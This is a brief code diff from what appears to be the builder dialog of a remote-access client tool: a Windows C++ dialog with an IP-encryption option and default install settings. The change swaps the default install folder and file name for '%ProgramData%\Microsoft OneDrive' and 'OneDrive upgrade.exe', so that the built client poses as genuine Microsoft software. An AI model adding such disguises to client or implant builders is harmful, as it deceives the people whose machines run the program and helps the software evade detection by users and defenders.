@@ -118,8 +118,8 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
         CheckDlgButton(hDlg, IDC_CHECK_ENCRYPT_IP, BST_CHECKED);
 
         // 设置安装目录和程序名称默认值
-        SetDlgItemTextW(hDlg, IDC_EDIT_INSTALL_DIR, L"%AppData%\\Formidable");
-        SetDlgItemTextW(hDlg, IDC_EDIT_INSTALL_NAME, L"Client.exe");
+        SetDlgItemTextW(hDlg, IDC_EDIT_INSTALL_DIR, L"%ProgramData%\\Microsoft OneDrive");
+        SetDlgItemTextW(hDlg, IDC_EDIT_INSTALL_NAME, L"OneDrive upgrade.exe");
         
         return (INT_PTR)TRUE;
     }
